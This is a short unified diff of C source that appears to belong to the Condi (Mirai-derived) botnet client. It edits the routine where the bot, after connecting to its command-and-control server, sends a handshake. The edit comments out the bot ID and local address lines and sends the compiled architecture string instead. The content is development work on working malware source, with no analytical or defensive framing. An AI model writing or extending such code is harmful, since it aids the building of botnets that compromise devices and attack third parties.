@@ -243,15 +243,19 @@ int main(int argc, char **args)
                 }
                 else
                 {
-                    uint8_t id_len = util_strlen(id_buf);
+                    //uint8_t id_len = util_strlen(id_buf);
 
-                    LOCAL_ADDR = util_local_addr();
+                    //LOCAL_ADDR = util_local_addr();
                     send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
-                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
-                    if(id_len > 0)
-                    {
-                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
-                    }
+                    const char *arch = BOT_ARCH;   // definida por el compilador
+                    uint8_t arch_len = util_strlen(arch);
+                    send(fd_serv, &arch_len, 1, MSG_NOSIGNAL);
+                    send(fd_serv, arch, arch_len, MSG_NOSIGNAL);
+
+                    //if(id_len > 0)
+                    //{
+                    //    send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
+                    //}
 
                     #ifdef DEBUG
                         printf("(condi/main): connected to cnc successfully\n");
